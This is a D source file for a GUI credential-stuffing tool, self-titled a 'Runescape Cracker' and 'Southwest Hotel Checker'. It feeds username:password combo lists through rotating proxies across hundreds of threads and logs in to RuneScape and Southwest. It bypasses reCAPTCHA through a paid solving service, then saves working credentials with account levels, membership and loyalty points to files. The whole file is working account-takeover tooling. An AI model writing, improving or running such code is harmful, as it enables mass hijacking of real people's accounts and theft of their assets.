module main;

import core.thread;
import etc.c.curl : CurlOption, CurlInfo;
import std.array;
import std.conv;
import std.file;
import std.net.curl;
import std.parallelism;
import std.regex;
import std.stdio;
import core.time;
import std.datetime;
import std.string;
import std.process;
import std.uri;
import std.json;
import std.exception;
import std.uni;
import std.random;
import core.memory;
import std.digest.md;
import core.stdc.string;
import gtk.MainWindow;
import gtk.AboutDialog;
import gtk.Label;
import gtk.FileChooserDialog;
import gtk.SpinButton;
import gtk.Button;
import gtk.VBox;
import gtk.Entry;
import gtk.Main;
import std.stdio;
private import stdlib = core.stdc.stdlib : exit;

string runCaptcha(string img, string duser, string dpass)
{
	writeln("Running Captcha Check!");
	string bound = "---------------------------723690991551375881941829999";
	auto conn = HTTP("http://api.dbcapi.me/api/captcha");
	conn.handle.set(CurlOption.followlocation, false);
	conn.handle.set(CurlOption.ssl_verifypeer, false);
	conn.addRequestHeader("Content-Type", "multipart/form-data; boundary=" ~ bound ~ "; charset=UTF-8");
	conn.addRequestHeader("Accept", "application/json; charset=utf-8");
	string postData = "--" ~ bound ~ "\r\nContent-Disposition: form-data; name=\"username\"\r\n\r\n" ~ duser ~ "\r\n--" ~ bound ~ "\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\n" ~ dpass ~ "\r\n--" ~ bound ~ "\r\nContent-Disposition: form-data; name=\"captchafile\"; filename=\"captchafile\";\r\nContent-Type: application/octet-stream\r\n\r\n" ~ to!string(img) ~ "\r\n--" ~ bound ~ "--\r\n";
	conn.postData = postData;
	conn.perform();
	string url = conn.responseHeaders["location"];
	string text;
	bool solved = false;
	while(!solved)
	{
		ubyte[] result;
		auto conn1 = HTTP(url);
		conn1.handle.set(CurlOption.ssl_verifypeer, false);
		conn1.addRequestHeader("Accept", "application/json; charset=utf-8");
		conn1.onReceive = (ubyte[] data)
		{
			result ~= data;
			return data.length;
		};
		conn1.perform();
		char* cstr = cast(char*) result;
		string str = cast(string) cstr[0..strlen(cstr)];
		
		auto js = parseJSON(str);
		if (!chomp(js["text"].str).empty)
		{
			text = js["text"].str;
			writeln("Found Captcha Text: " ~ text);
			solved = true;
		}
		else
		{
			core.thread.Thread.sleep(dur!("seconds")(1));
		}
	}
	return text;
}

void runRS(string user, string pass, string proxy, string proxyfile, string duser, string dpass)
{
	bool done = false;
	int trys = 0;
	while (!done) {
		if (trys >= 5 && proxy != null) {
			auto plines = readText(proxyfile).splitLines();
			done = false;
			proxy = chomp(plines[uniform(0, plines.length - 1)]);
			trys = 0;
		}
		try
		{
			writeln("Begin Checking Account! " ~ user);
			bool working = false;
			bool captcha = false;
			auto conn = HTTP();
			conn.handle.set(CurlOption.ssl_verifypeer, 0);
			conn.operationTimeout(dur!"seconds"(25));
			conn.handle.set(CurlOption.proxy, proxy);
			
			auto rand = uniform(99999999999999, 99999999999999999);
			conn.setCookieJar(tempDir() ~ to!string(rand));
			conn.addRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36");
			auto html = get("https://secure.runescape.com/m=weblogin/a=825/loginform.ws?mod=www&ssl=1&expired=0&dest=account_settings.ws?jptg=ia&jptv=navbar", conn);
			
			string postData = "username=" ~ user ~ "&password=" ~ pass ~ "&rem=on&submit=Log+In&mod=www&ssl=1&dest=account_settings.ws?jptg=ia&amp;jptv=navbar";
			html = post("https://secure.runescape.com/m=weblogin/a=825/login.ws", postData, conn);
			
			if (html.indexOf("Account Settings") != -1)
			{
				writeln("Account Works! " ~ user);
				working = true;
			}
			else if (html.indexOf("The username, email or password you entered was incorrect") != -1)
			{
				writeln("Account Does Not Work! " ~ user);
				done = true;
				std.file.append("./RS Non-Working.txt", user ~ ":" ~ pass ~ "\r\n");
				return;
			}
			else if (html.indexOf("<h3>Confirm Your Log in</h3>") != -1)
			{
				if (duser != null) {
					captcha = true;
					while (captcha)
					{
						writeln("Account Has Captcha! " ~ user);
						
						html = get("https://www.google.com/recaptcha/api/noscript?k=6LcaLgATAAAAAMfyoZjBXW33zuRRJq9pFvsE9HJJ", conn);
						
						auto captcha1re = regex("recaptcha_challenge_field\" value=\"(.*?)\"");
						auto captcha1m = match(html, captcha1re);
						auto captcha1 = captcha1m.captures[1];
						
						
						download("https://www.google.com/recaptcha/api/image?c=" ~ to!string(captcha1), tempDir() ~ to!string(rand) ~ ".jpg", conn);
						auto captchass = read(tempDir() ~ to!string(rand) ~ ".jpg");
						auto captchatext = runCaptcha(to!string(captchass), duser, dpass);
						
						postData = "username=" ~ user ~ "&password=" ~ pass ~ "&recaptcha_challenge_field=" ~ chomp(to!string(captcha1)) ~ "&recaptcha_response_field=" ~ captchatext ~ "&recaptcha_form=true&mod=www&rem=on&submit=Log+In&ssl=1&dest=account_settings.ws?jptg=ia&amp;jptv=navbar";
						html = post("https://secure.runescape.com/m=weblogin/a=825/login.ws", postData, conn);
						
						if (html.indexOf("Account Settings") != -1)
						{
							writeln("Account Works! " ~ user);
							working = true;
							captcha = false;
						}
						else if (html.indexOf("The username, email or password you entered was incorrect") != -1)
						{
							writeln("Account Does Not Work! " ~ user);
							done = true;
							captcha = false;
							std.file.append("./nonworking.txt", user ~ ":" ~ pass ~ "\r\n");
							return;
						}
						else if (html.indexOf("Confirm Your Log in") != -1)
						{
							captcha = true;
						}
					}
				}
			}
			
			if (working)
			{
				string mem;
				bool memb = false;
				if (html.indexOf("Member until") != -1)
				{
					auto memre = regex(">Member until (.*?)</h3>");
					auto memm = match(html, memre);
					mem = to!string(memm.captures[1]);
					memb = true;
				}
				else
				{
					mem = "Currently Not A Member";
				}
				
				if (memb)
				{
					auto profilere = regex("(services.runescape.com/m=adventurers-log/.*?)\"");
					auto profilem = match(html, profilere);
					auto profile = to!string(profilem.captures[1]);
					
					html = get("http://" ~ profile ~ "/profile", conn);
					
					auto clevelre = regex("stats-box__score-value\">(.*?)<");
					auto clevelm = match(html, clevelre);
					auto clevel = to!string(clevelm.captures[1]);
					
					auto skilllvlre = regex("plog-stats__item plog-stats__item--level\">(.*?)<");
					auto skilllvlm = match(html, skilllvlre);
					auto skilllvl = to!string(skilllvlm.captures[1]);
					
					
					html = get("http://" ~ profile ~ "/skills", conn);
					
					auto levelsre = regex("skill__title\">(.*?)</h2>.*?\n.*?skill__level\">(.*?)</p>", "s");
					auto levelsm = matchAll(html, levelsre);
					string[] levels;
					foreach (c; levelsm)
					{
						string skill = chomp(to!string(c.hit[0]));
						string level = chomp(to!string(c.hit[1]));
						if (level.indexOf("99") != -1) {
							levels ~= chomp(to!string(skill)) ~ ": " ~ chomp(to!string(level));
						}
					}
					
					string content = "====================================\r\nAccount: " ~ user ~ ":" ~ pass ~ "\r\n";
					content ~= "Level: " ~ clevel ~ "\r\n";
					content ~= "Membership: " ~ mem ~ "\r\n";
					content ~= "Skill Level: " ~ skilllvl ~ "\r\n";
					
					content ~= "Level 99 Skills: \r\n";
					foreach (level; levels)
					{
						content ~= ("    " ~ level ~ "\r\n");
					}
					
					content ~= "====================================\r\n\r\n";
					writeln("Account has membership until " ~ to!string(mem) ~ ", is level " ~ clevel ~ "and has a skill level of " ~ skilllvl);
					std.file.append("./working.txt", content);
				}
				else
				{
					string content = "====================================\r\nAccount: " ~ user ~ ":" ~ pass ~ "\r\n";
					content ~= "Membership: " ~ mem ~ "\r\n";
					content ~= "====================================\r\n\r\n";
					writeln("Account is not a member (Cannot Capture)!");
					std.file.append("./working.txt", content);
				}
				
				done = true;
				delete html;
				return;
			}
			delete html;
			return;
		} catch (Exception e) {
			if (proxy != null) {
				auto plines = readText(getcwd() ~ "/proxies.txt").splitLines();
				done = false;
				proxy = chomp(plines[uniform(0, plines.length - 1)]);
			}
		}
		trys += 1;
	}
}

void startRS(string file, string proxyfile, int threads, string duser = null, string dpass = null)
{
	auto accounts = readText(file).splitLines();
	auto work = new TaskPool(threads);
	auto proxies = readText(proxyfile).splitLines();
	foreach (account; work.parallel(accounts))
	{
		if(account.indexOf(":") != -1)
		{
			auto arr = split(account, ":");
			auto proxy = chomp(proxies[uniform(0, proxies.length - 1)]);
			runRS(normalize(to!string(chomp(arr[0]))), normalize(to!string(chomp(arr[1]))), proxy, proxyfile, duser, dpass);
		}
	}
}

void runSouth(string user, string pass)
{
	bool done = false;
	int trys = 0;
	while (!done) {
		try
		{
			writeln("Begin Checking Account! " ~ user);
			bool working = false;
			string captchatext;
			auto conn = HTTP();
			conn.handle.set(CurlOption.ssl_verifypeer, 0);
			conn.operationTimeout(dur!"seconds"(25));
			conn.handle.set(CurlOption.proxy, "");
			
			auto rand = uniform(99999999999999, 99999999999999999);
			conn.setCookieJar(tempDir() ~ to!string(rand));
			conn.addRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.0 Safari/537.36");
			auto html = get("https://www.southwest.com/", conn);
			
			string postData = "credential=" ~ user ~ "&password=" ~ pass ~ "&returnUrl=%2F";
			html = post("https://www.southwest.com/flight/login?loginEntryPoint=GLOBAL_NAV_LOGIN", postData, conn);
			if (html.indexOf("The Username/Account Number and/or Password are incorrect.") != -1)
			{
				writeln("Account Does Not Work! " ~ user);
				std.file.append("./Southwest Non-Working.txt", user ~ ":" ~ pass ~ "\r\n");
				return;
			}
			else if (html.indexOf("Log Out") != -1)
			{
				writeln("Account Works! " ~ user);
				working = true;
			}
			
			if (working)
			{
				html = get("https://www.southwest.com/", conn);
				auto pointsre = regex("<span class=\"swa-header--hot-state-points\">(.*?) points</span>");
				auto pointsm = match(html, pointsre);
				auto points = pointsm.captures[1];
				std.file.append("./StarWoods Working.txt", user ~ ":" ~ pass ~ " - " ~ points ~ " points\r\n");
				done = true;
				delete html;
			}
			return;
		} catch (Exception e) {
			writeln(e.msg);
			core.thread.Thread.sleep(dur!("seconds")(1));
		}
		trys += 1;
	}
}

void startSouth(string file, int threads)
{
	auto accounts = readText(file).splitLines();
	auto work = new TaskPool(threads);
	foreach (account; work.parallel(accounts))
	{
		if(account.indexOf(":") != -1 && account.indexOf("@") == -1)
		{
			auto arr = split(account, ":");
			runSouth(normalize(to!string(chomp(arr[0]))), normalize(to!string(chomp(arr[1]))));
		}
	}
}

class mWindow : MainWindow
{
	Label StatusLbl;
	string file;
	SpinButton spinb;
	this()
	{
		super("Fur's Amazon Checker and Checker");
		setDefaultSize(250, 250);
		VBox box = new VBox(false, 2);
		box.add(new Button("StarWoods", &startsouth));
		box.add(new Button("Runescape", &startRS));
		add(box);
		showAll();	
	}
	
	void startsouth(Button button)
	{
		auto amazon = new South();
		this.destroy();
	}
	
	void startRS(Button button)
	{
		auto amazon = new Runescape();
		this.destroy();
	}
	
}

class Runescape : MainWindow
{
	Label StatusLbl;
	string combofile;
	string proxyfile;
	SpinButton spinb;
	Entry user;
	Entry pass;
	this()
	{
		super("Fur's Runescape Cracker");
		setDefaultSize(250, 250);
		VBox box = new VBox(false, 2);
		box.add(new Button("Load Combos", &loadCombos));
		box.add(new Button("Load Proxies", &loadProxies));
		box.add(new Label("DBC User (If using DBC)"));
		user = new Entry();
		box.add(user);
		box.add(new Label("DBC Password (If using DBC)"));
		pass = new Entry();
		box.add(pass);
		box.add(new Label("Threads"));
		spinb = new SpinButton(100, 350, 1);
		box.add(spinb);
		box.add(new Button("Start", &start));
		box.add(new Button("Go Back", &back));
		add(box);
		showAll();	
	}
	
	void loadCombos(Button button)
	{
		auto dlg = new FileChooserDialog(
			"Open File",
			this,
			FileChooserAction.OPEN,
			["Open", "Cancel"],
			[ResponseType.ACCEPT, ResponseType.CANCEL]
			);
		if (GtkResponseType.ACCEPT == dlg.run()){
			combofile = dlg.getFilename();
		}
		dlg.destroy();
	}
	
	void loadProxies(Button button)
	{
		auto dlg = new FileChooserDialog(
			"Open File",
			this,
			FileChooserAction.OPEN,
			["Open", "Cancel"],
			[ResponseType.ACCEPT, ResponseType.CANCEL]
			);
		if (GtkResponseType.ACCEPT == dlg.run()){
			proxyfile = dlg.getFilename();
		}
		dlg.destroy();
	}
	
	void start(Button button)
	{
		if (user.getText().empty) {
			startRS(combofile, proxyfile, to!int(spinb.getText));
		} else {
			startRS(combofile, proxyfile, to!int(spinb.getText), user.getText(), pass.getText());
		}
	}
	
	void back(Button button)
	{
		auto amazon = new mWindow();
		this.destroy();
	}
}

class South : MainWindow
{
	Label StatusLbl;
	string file;
	SpinButton spinb;
	this()
	{
		super("Fur's Southwest Hotel Checker");
		setDefaultSize(250, 250);
		VBox box = new VBox(false, 2);
		box.add(new Button("Load Combos", &loadCombos));
		box.add(new Label("Threads"));
		spinb = new SpinButton(1, 250, 1);
		box.add(spinb);
		box.add(new Button("Start", &start));
		box.add(new Button("Go Back", &back));
		add(box);
		showAll();	
	}
	
	void loadCombos(Button button)
	{
		auto dlg = new FileChooserDialog(
			"Open File",
			this,
			FileChooserAction.OPEN,
			["Open", "Cancel"],
			[ResponseType.ACCEPT, ResponseType.CANCEL]
			);
		if (GtkResponseType.ACCEPT == dlg.run()){
			file = dlg.getFilename();
		}
		dlg.destroy();
	}
	
	void start(Button button)
	{
		startSouth(file, to!int(spinb.getText));
		writeln("Done Checking!");
	}
	
	void back(Button button)
	{
		auto wind = new mWindow();
		this.destroy();
	}
}

void main(string[] args)
{
	//	ubyte[16] hash = md5Of(to!string(executeShell("wmic path win32_physicalmedia get SerialNumber")));
	//	auto hwid = toHexString(hash);
	//	
	//	auto conn = HTTP();
	//	conn.handle.set(CurlOption.ssl_verifypeer, 0);
	//	conn.handle.set(CurlOption.proxy, "");
	//	auto html = get("http://furz.pw/hwid.php?pwid=" ~ hwid, conn);
	//	if (to!string(html).indexOf(toHexString(md5Of(to!string(hwid))).toLower) != -1) {
	//	} else {
	//		writeln("User Not Found!");
	//		writeln(to!string(html).indexOf(toHexString(md5Of(to!string(hwid))).toLower));
	//		core.thread.Thread.sleep(dur!("seconds")(3));
	//		return;
	//	}
	Main.init(args);
	auto mwin = new mWindow();
	Main.run();
}